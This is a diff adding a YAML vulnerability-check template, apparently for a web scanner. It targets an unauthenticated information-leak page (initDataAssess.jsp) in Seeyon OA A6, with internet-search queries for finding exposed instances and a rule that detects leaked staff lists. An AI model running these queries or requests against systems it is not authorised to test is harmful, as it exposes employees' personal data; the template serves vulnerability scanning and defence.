@@ -1,0 +1,42 @@
+detail:
+  vulnerability:
+    level: critical
+    fofa-query: app="致远A6"
+    hunter-query: web.title="致远A6" or web.body="致远A6"
+    quake-query: title="致远A6" or  body="致远A6"
+    zoomeye-query: app:"Seeyon OA A6"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: 
+    
+name: poc-yaml-zhiyuan-A6-initDataAssess.jsp-unleak
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: GET
+      cache: true
+      path: /yyoa/assess/js/initDataAssess.jsp
+      follow_redirects: false      
+      headers:
+      body: 
+    expression: >-
+      response.status == 200 && response.raw_header.bcontains(b"text/html")  &&  response.body_string.contains("personList")
+
+    output:
+      search: |-
+        "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+      filename: search["filename"]
+      search1: |-
+        "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+      newpath: search["newpath"]
+  
+expression: r0() 
